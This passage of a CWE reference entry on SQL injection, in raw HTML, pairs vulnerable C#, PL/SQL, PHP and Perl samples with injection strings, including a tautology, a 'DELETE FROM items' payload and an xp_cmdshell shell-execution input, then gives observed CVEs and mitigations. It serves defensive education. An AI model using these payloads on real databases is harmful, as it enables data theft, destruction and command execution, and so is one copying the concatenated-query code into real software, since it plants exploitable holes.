"' AND itemname = '" + ItemName.Text + "'";&lt;/div&gt;&lt;div style="font-size:90%;"&gt;sda = new SqlDataAdapter(query, conn);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;DataTable dt = new DataTable();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;sda.Fill(dt);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The query that this code intends to execute follows:&lt;/p&gt;&lt;div class="indent "&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT * FROM items WHERE owner = &amp;lt;userName&amp;gt; AND
itemname = &amp;lt;itemName&amp;gt;;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;However, because the query is constructed dynamically by concatenating
a constant base query string and a user input string, the query only
behaves correctly if itemName does not contain a single-quote character.
If an attacker with the user name wiley enters the string:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;name' OR 'a'='a&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;for itemName, then the query becomes the following:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR
'a'='a';&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The addition of the:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;OR 'a'='a'&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;condition causes the WHERE clause to always evaluate to true, so the
query becomes logically equivalent to the much simpler query:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT * FROM items;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This simplification of the query allows the attacker to bypass the
requirement that the query only return items owned by the authenticated
user; the query now returns all entries stored in the items table,
regardless of their specified owner.&lt;/p&gt;&lt;p class="subheading"&gt;Example 3&lt;/p&gt;&lt;p&gt;This example examines the effects of a different malicious value
passed to the query constructed and executed in the previous
example.&lt;/p&gt;&lt;p&gt;If an attacker with the user name wiley enters the string:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;name'; DELETE FROM items; --&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;for itemName, then the query becomes the following two queries:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;SQL&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT * FROM items WHERE owner = 'wiley' AND itemname =
'name';&lt;/div&gt;&lt;div style="font-size:90%;"&gt;DELETE FROM items;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;--'&lt;/i&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Many database servers, including Microsoft(R) SQL Server 2000, allow
multiple SQL statements separated by semicolons to be executed at once.
While this attack string results in an error on Oracle and other
database servers that do not allow the batch-execution of statements
separated by semicolons, on databases that do allow batch execution,
this type of attack allows the attacker to execute arbitrary commands
against the database.&lt;/p&gt;&lt;p&gt;Notice the trailing pair of hyphens (--), which specifies to most
database servers that the remainder of the statement is to be treated as
a comment and not executed. In this case the comment character serves to
remove the trailing single-quote left over from the modified query. On a
database where comments are not allowed to be used in this way, the
general attack could still be made effective using a trick similar to
the one shown in the previous example.&lt;/p&gt;&lt;p&gt;If an attacker enters the string&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Then the following three valid statements will be created:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT * FROM items WHERE owner = 'wiley' AND itemname =
'name';&lt;/div&gt;&lt;div style="font-size:90%;"&gt;DELETE FROM items;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;SELECT * FROM items WHERE 'a'='a';&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;One traditional approach to preventing SQL injection attacks is to
handle them as an input validation problem and either accept only
characters from a whitelist of safe values or identify and escape a
blacklist of potentially malicious values. Whitelisting can be a very
effective means of enforcing strict input validation rules, but
parameterized SQL statements require less maintenance and can offer more
guarantees with respect to security. As is almost always the case,
blacklisting is riddled with loopholes that make it ineffective at
preventing SQL injection attacks. For example, attackers can:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Target fields that are not quoted&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Find ways to bypass the need for certain escaped
meta-characters&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Use stored procedures to hide the injected meta-characters.
&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Manually escaping characters in input to SQL queries can help, but it
will not make your application secure from SQL injection attacks.&lt;/p&gt;&lt;p&gt;Another solution commonly proposed for dealing with SQL injection
attacks is to use stored procedures. Although stored procedures prevent
some types of SQL injection attacks, they fail to protect against many
others. For example, the following PL/SQL procedure is vulnerable to the
same SQL injection attack shown in the first example.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm
in varchar2)&lt;/div&gt;&lt;div style="font-size:90%;"&gt;is open itm_cv for&lt;/div&gt;&lt;div style="font-size:90%;"&gt;' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND
itemname = ' || itm || ';&lt;/div&gt;&lt;div style="font-size:90%;"&gt;end get_item;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Stored procedures typically help prevent SQL injection attacks by
limiting the types of statements that can be passed to their parameters.
However, there are many ways around the limitations and many interesting
statements that can still be passed to stored procedures. Again, stored
procedures can prevent some exploits, but they will not make your
application secure against SQL injection attacks.&lt;/p&gt;&lt;p class="subheading"&gt;Example 4&lt;/p&gt;&lt;p&gt;MS SQL has a built in function that enables shell command execution.
An SQL injection in such a context could be disastrous. For example, a query
of the form:&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input'
ORDER BY PRICE&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Where $user_input is taken from the user and unfiltered.&lt;/p&gt;&lt;p&gt;If the user provides the string:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;' exec master..xp_cmdshell 'vol' --&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The query will take the following form: "&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='' exec
master..xp_cmdshell 'vol' --' ORDER BY PRICE&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Now, this query can be broken down into:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;[1] a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE
ITEM_CATEGORY=''&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;[2] a second SQL query, which executes a shell command: exec
master..xp_cmdshell 'vol'&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;[3] an MS SQL comment: --' ORDER BY PRICE&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;As can be seen, the malicious input changes the semantics of the query
into a query, a shell command execution and a comment.&lt;/p&gt;&lt;p class="subheading"&gt;Example 5&lt;/p&gt;&lt;p&gt;This code intends to print a message summary given the message
ID.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;PHP&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;$id = $_COOKIE["mid"];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;mysql_query("SELECT MessageID, Subject FROM messages WHERE
MessageID = '$id'");&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The programmer may have skipped any input validation on $id under the
assumption that attackers cannot modify the cookie. However, this is
easy to do with custom client code or even in the web browser.&lt;/p&gt;&lt;p&gt;While $id is wrapped in single quotes in the call to mysql_query(), an
attacker could simply change the incoming mid cookie to:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;1432' or '1' = '1&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This would produce the resulting query:&lt;/p&gt;&lt;div class="indent Result"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Result)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;SELECT MessageID, Subject FROM messages WHERE MessageID = '1432'
or '1' = '1'&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Not only will this retrieve message number 1432, it will retrieve all
other messages.&lt;/p&gt;&lt;p&gt;In this case, the programmer could apply a simple modification to the
code to eliminate the SQL injection:&lt;/p&gt;&lt;div class="indent Good_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Good Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;PHP&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;$id = intval($_COOKIE["mid"]);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;mysql_query("SELECT MessageID, Subject FROM messages WHERE
MessageID = '$id'");&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;However, if this code is intended to support multiple users with
different message boxes, the code might also need an access control
check (CWE-285) to ensure that the application user has the permission
to see that message.&lt;/p&gt;&lt;p class="subheading"&gt;Example 6&lt;/p&gt;&lt;p&gt;This example attempts to take a last name provided by a user and
enter it into a database.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Perl&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;$userKey = getUserID();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;$name = getUserInput();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;# ensure only letters, hyphens and apostrophe are
allowed&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;$name = whiteList($name, "^a-zA-z'-$");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;$query = "INSERT INTO last_names VALUES('$userKey',
'$name')";&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;While the programmer applies a whitelist to the user input, it has
shortcomings. First of all, the user is still allowed to provide hyphens
which are used as comment structures in SQL. If a user specifies -- then
the remainder of the statement will be treated as a comment, which may
bypass security logic. Furthermore, the whitelist permits the apostrophe
which is also a data / command separator in SQL. If a user supplies a
name with an apostrophe, they may be able to alter the structure of the
whole statement and even change control flow of the program, possibly
accessing or modifying confidential information. In this situation, both
the hyphen and apostrophe are legitimate characters for a last name and
permitting them is required. Instead, a programmer may want to use a
prepared statement or apply an encoding routine to the input to prevent
any data / directive misinterpretations.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_89_Observed Examples" id="oc_89_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0366" target="_blank"&gt;CVE-2004-0366&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;chain: SQL injection in library intended for
database authentication allows SQL injection and authentication bypass.
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2790" target="_blank"&gt;CVE-2008-2790&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection through an ID that was supposed to
be numeric.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2223" target="_blank"&gt;CVE-2008-2223&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection through an ID that was supposed to
be numeric.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6602" target="_blank"&gt;CVE-2007-6602&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection via user
name.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5817" target="_blank"&gt;CVE-2008-5817&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection via user name or password
fields.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0377" target="_blank"&gt;CVE-2003-0377&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection in security product, using a crafted
group name.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2380" target="_blank"&gt;CVE-2008-2380&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection in authentication
library.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_89_Potential Mitigations" id="oc_89_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Libraries or Frameworks&lt;/p&gt;&lt;p&gt;Use a vetted library or framework that does not allow this weakness to
occur or provides constructs that make this weakness easier to
avoid.&lt;/p&gt;&lt;p&gt;For example, consider using persistence layers such as Hibernate or
Enterprise Java Beans, which can provide significant protection against
SQL injection if used properly.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Parameterization&lt;/p&gt;&lt;p&gt;If available, use structured mechanisms that automatically enforce the
separation between data and code. These mechanisms may be able to
provide the relevant quoting, encoding, and validation automatically,
instead of relying on the developer to provide this capability at every
point where output is generated.&lt;/p&gt;&lt;p&gt;Process SQL queries using prepared statements, parameterized queries,
or stored procedures. These features should accept parameters or
variables and support strong typing. Do not dynamically construct and
execute query strings within these features using "exec" or similar
functionality, since you may re-introduce the possibility of SQL
injection.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Follow the principle of least privilege when creating user accounts to
a SQL database. The database users should only have the minimum
privileges necessary to use their account. If the requirements of the
system indicate that a user can read and modify their own data, then
limit their privileges so they cannot read/write others' data. Use the
strictest permissions possible on all database objects, such as
execute-only for stored procedures.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;For any security checks that are performed on the client side, ensure
that these checks are duplicated on the server side, in order to avoid
CWE-602. Attackers can bypass the client-side checks by modifying values
after the checks have been performed, or by changing the client to
remove the client-side checks entirely. Then, these modified values
would be submitted to the server.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;If you need to use dynamically-generated query strings in spite of the
risk, use proper encoding and escaping of inputs. Instead of building
your own implementation, such features may be available in the database
or programming language. For example, the Oracle DBMS_ASSERT package can
check or enforce that parameters have certain properties that make them
less vulnerable to SQL injection. For MySQL, the
mysql_real_escape_string() API function is available in both C and
PHP.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Input Validation&lt;/p&gt;&lt;p&gt;Assume all input is malicious. Use an "accept known good" input
validation strategy, i.e., use a whitelist of acceptable inputs that
strictly conform to specifications. Reject any input that does not
strictly conform to specifications, or transform it into something that
does. Do not rely exclusively on looking for malicious or malformed
inputs (i.e., do not rely on a blacklist). However, blacklists can be
useful for detecting potential attacks or determining which inputs are
so malformed that they should be rejected outright.&lt;/p&gt;&lt;p&gt;When performing input validation, consider all potentially relevant
properties, including length, type of input, the full range of
acceptable values, missing or extra inputs, syntax, consistency across
related fields, and conformance to business rules. As an example of
business rule logic, "boat" may be syntactically valid because it only
contains alphanumeric characters, but it is not valid if you are
expecting colors such as "red" or "blue."&lt;/p&gt;&lt;p&gt;When constructing SQL query strings, use stringent whitelists that
limit the character set based on the expected value of the parameter in
the request. This will indirectly limit the scope of an attack, but this
technique is less important than proper output encoding and
escaping.&lt;/p&gt;&lt;p&gt;Note that proper output encoding, escaping, and quoting is the most
effective solution for preventing SQL injection, although input
validation may provide some defense-in-depth. This is because it
effectively limits what will appear in output. Input validation will not
always prevent SQL injection, especially if you are required to support
free-form text fields that could contain arbitrary characters. For
example, the name "O'Reilly" would likely pass the validation step,
since it is a common last name in the English language. However, it
cannot be directly inserted into the database because it contains the
"'" apostrophe character, which would need to be escaped or otherwise
handled. In this case, stripping the apostrophe might reduce the risk of
SQL injection, but it would produce incorrect behavior because the wrong
name would be recorded.&lt;/p&gt;&lt;p&gt;When feasible, it may be safest to disallow meta-characters entirely,
instead of escaping them. This will provide some defense in depth. After
the data is entered into the database, later processes may neglect to
escape meta-characters before use, and you may not have control over
those processes.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Testing; Implementation&lt;/p&gt;&lt;p&gt;Use automated static analysis tools that target this type of weakness.
Many modern techniques use data flow analysis to minimize the number of
false positives. This is not a perfect solution, since 100% accuracy and
coverage are not feasible.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use dynamic tools and techniques that interact with the software using
large test suites with many diverse inputs, such as fuzz testing
(fuzzing), robustness testing, and fault injection. The software's
operation may slow down, but it should not become unstable, crash, or
generate incorrect results.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Operation&lt;/p&gt;&lt;p&gt;Use an application firewall that can detect attacks against this
weakness. This might not catch all attacks, and it might require some
effort for customization. However, it can be beneficial in cases in
which the code cannot be fixed (because it is controlled by a third
party), as an emergency prevention measure while more comprehensive
software assurance measures are applied, or to provide defense in
depth.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_89_Relationships" id="oc_89_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;77&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=77" 